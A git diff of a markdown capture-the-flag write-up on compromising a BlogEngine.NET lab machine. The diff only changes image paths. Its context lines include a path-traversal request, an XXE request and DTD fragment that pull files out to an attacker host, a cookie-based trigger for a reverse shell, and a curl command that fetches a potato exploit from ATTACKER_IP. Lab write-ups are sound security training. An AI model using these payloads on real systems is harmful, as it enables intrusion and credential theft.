@@ -55,19 +55,19 @@ It looks like we're dealing with a Windows machine and judging from default scri
 
 Since we can't do anything over RDP without credentials and the mysterious service isn't responding to Netcat, I launch Gobuster to find subdirectories/subdomains for the web server. This provides me with a page at /blog which hosts stories about Cyber-Medieval mashup stories.
 
-![](../assets/img/2026-02-15-Exfilibur/1.png)
+![](/assets/img/2026-02-15-Exfilibur/1.png)
 
 Taking a look around the site showed both a contact form as well as a comment feature that allowed for stored text to be sent. I test these fields with  cross-site scripting payloads in hopes to capture a cookie but neither work to send me anything, meaning no administrator is monitoring the site as of now.
 
-![](../assets/img/2026-02-15-Exfilibur/2.png)
+![](/assets/img/2026-02-15-Exfilibur/2.png)
 
 Checking out how the posts are loaded shows no obvious IDOR vulnerabilities or locations prone to SQL injection. It seems like most if not all of the user-supplied fields are sanitized or not functioning so we'll have to enumerate more to expand the attack surface. The last tab is an admin login panel which shows that the site's built with `BlogEngine.NET`, again it doesn't seem to be vulnerable to injection or default credentials.
 
-![](../assets/img/2026-02-15-Exfilibur/3.png)
+![](/assets/img/2026-02-15-Exfilibur/3.png)
 
 A peak at the source code discloses its version and I utilize that to find any known vulnerabilities pertaining to it.
 
-![](../assets/img/2026-02-15-Exfilibur/4.png)
+![](/assets/img/2026-02-15-Exfilibur/4.png)
 
 Searchsploit returns a few promising results.
 
@@ -91,11 +91,11 @@ Reading through the contents of these exploits shows a few things in common, the
 /blog/api/filemanager?path=%2F..%2F..%2F
 ```
 
-![](../assets/img/2026-02-15-Exfilibur/5.png)
+![](/assets/img/2026-02-15-Exfilibur/5.png)
 
 I use this to enumerate the file system and find a ton of XML documents under `/App_Data`, a few stood out to me. The roles and users file should give us a pretty good information about accounts on the system.
 
-![](../assets/img/2026-02-15-Exfilibur/6.png)
+![](/assets/img/2026-02-15-Exfilibur/6.png)
 
 Problem is, we can't actually read these files and don't yet have a way of obtaining them. That's where the next known vulnerability comes into play, [CVE-2019–11392](https://nvd.nist.gov/vuln/detail/CVE-2019-11392) allows for XML External Entities to be injected at `/syndication.axd` by means of an apml file.
 
@@ -106,7 +106,7 @@ I find that this [Security Metrtics article](https://www.securitymetrics.com/blo
 /blog/syndication.axd?apml=http://ATTACKING_MACHINE/oob.xml
 ```
 
-![](../assets/img/2026-02-15-Exfilibur/7.png)
+![](/assets/img/2026-02-15-Exfilibur/7.png)
 
 Sick, we can confirm that this parameter works to make outbound requests to our machine in an attempt to grab XML files. Next, let's host an XXE payload that will read those files that we enumerated earlier. For this we'll need to host an XML doc that points toward a malicious `.dtd` file also on our machine.
 
@@ -130,7 +130,7 @@ Trying that throws an error that the server is unable to connect to the server. 
 
 I figure that it's probably not sniping all TCP traffic, so I try other common ports and find that 445 (SMB) works just fine.
 
-![](../assets/img/2026-02-15-Exfilibur/8.png)
+![](/assets/img/2026-02-15-Exfilibur/8.png)
 
 Now let's change that `.dtd` file to point towards `users.xml` under the `/App_Data` folder. If needed, you can backtrack to our previous step to enumerate the full path, however files on web servers (port 80) are typically stored in `inetpub/wwwroot/[APPLICATION_NAME]`.
 
@@ -140,19 +140,19 @@ Now let's change that `.dtd` file to point towards `users.xml` under the `/App_D
 %p2;
 ```
 
-![](../assets/img/2026-02-15-Exfilibur/9.png)
+![](/assets/img/2026-02-15-Exfilibur/9.png)
 
 One callback later rewards us with a URL-encoded string containing user credentials for the website. I send it over to CyberChef to make sense of it and grab the password for Administrator.
 
-![](../assets/img/2026-02-15-Exfilibur/10.png)
+![](/assets/img/2026-02-15-Exfilibur/10.png)
 
 Note that whenever decoding the string, that `+` sign character will get treated as a space so uncheck that box if you're using CyberChef. From there, the passwords are stored as hashes so we must decode them further. The correct recipe is `From Base64` -> `To Hex` **(no delimiter)** to get the `SHA256` hashes which we can then send to Hashcat or JohnTheRipper to get their plaintext equivalents.
 
-![](../assets/img/2026-02-15-Exfilibur/11.png)
+![](/assets/img/2026-02-15-Exfilibur/11.png)
 
 Only guest cracks but now we can login at the website to start enumeration internally. I thought we were going to have to exploit a cookie or take advantage of some kind of LFI vulnerability to get admin privileges, but their plaintext password is literally sitting in a draft post meant to be a secret 'key'.
 
-![](../assets/img/2026-02-15-Exfilibur/12.png)
+![](/assets/img/2026-02-15-Exfilibur/12.png)
 
 I use that to switch over to Admin and find a few new options to play around with to manage the website and its themes. Instead of wasting time there, I thought back to right after version disclosure; I found [CVE-2019–10719](https://nvd.nist.gov/vuln/detail/CVE-2019-10719), which is an RCE vulnerability made possible via the upload API. At the time we needed credentials, but now we have access, so let's try exploiting that to grant us a reverse shell as the server's running UID.
 
@@ -217,7 +217,7 @@ I begin by creating a malicious `PostView.ascx` file containing a reverse shell 
 
 Next, we capture a request to the upload API by using the File manager option within the post editing feature.
 
-![](../assets/img/2026-02-15-Exfilibur/13.png)
+![](/assets/img/2026-02-15-Exfilibur/13.png)
 
 I tried using this traversal to upload our reverse shell to the themes directory but I guess the site wouldn't allow for it, or we didn't have write access (honestly not too sure). Either way we could really just upload it to the default folder at `~/App_Data/files` and use yet another vulnerability to proc it. [CVE-2019–10720](https://nvd.nist.gov/vuln/detail/CVE-2019-10720) allows for Directory Traversal and Remote Code Execution via the theme cookie to the File Manager, so it's kind of similar to what I tried to do, except we use the cookie to proc it instead of the Themes tab. 
 
@@ -227,22 +227,22 @@ I tried using this traversal to upload our reverse shell to the themes directory
 curl -b "theme=../../App_Data/files" http://MACHINE_IP/blog
 ```
 
-![](../assets/img/2026-02-15-Exfilibur/14.png)
+![](/assets/img/2026-02-15-Exfilibur/14.png)
 
 Note: This took a bit of troubleshooting so if it doesn't work for you, try a few different directories and tools to proc the shell.
 
 ## Privilege Escalation
 Now that we have a shell on the box as Merlin, let's figure out what to use in our quest to escalate privileges to administrator. It seems that he has access to the `SeImpersonatePrivilege`, so we may be able to utilize a 'Potato' exploit for our goal.
 
-![](../assets/img/2026-02-15-Exfilibur/15.png)
+![](/assets/img/2026-02-15-Exfilibur/15.png)
 
 There is just one other user besides our current account. I'll keep my eye out for any files pertaining to their role/user.
 
-![](../assets/img/2026-02-15-Exfilibur/16.png)
+![](/assets/img/2026-02-15-Exfilibur/16.png)
 
 On a whim, I tried reusing the credentials found in the draft post on the web application for this new user and actually got a successful login over RDP.
 
-![](../assets/img/2026-02-15-Exfilibur/17.png)
+![](/assets/img/2026-02-15-Exfilibur/17.png)
 
 At this point we can grab the user flag under his Desktop directory. This account doesn't have any crazy privileges so I just swap back to our reverse shell for admin privesc. As we have access to SeImpersonatePrivileges, there is a myriad of ways to grab a shell as SYSTEM. 
 
@@ -256,10 +256,10 @@ curl http://ATTACKER_IP/EfsPotato.cs -o EfsPotato.cs
 
 After uploading the file to a writeable directory and compiling it as instructed, I use the tool to change the administrator's password using `cmd.exe`.
 
-![](../assets/img/2026-02-15-Exfilibur/18.png)
+![](/assets/img/2026-02-15-Exfilibur/18.png)
 
 Finally we can use those creds to authenticate over RDP and grab the final flag under their desktop folder.
 
-![](../assets/img/2026-02-15-Exfilibur/19.png)
+![](/assets/img/2026-02-15-Exfilibur/19.png)
 
 That's all y'all, this box was a pretty fun one that really revolved around exploiting the vulnerable BlogEngine application. I liked the theme and how we had to bypass the firewalls in place to grab shells. I hope this was helpful to anyone following along or stuck and happy hacking!
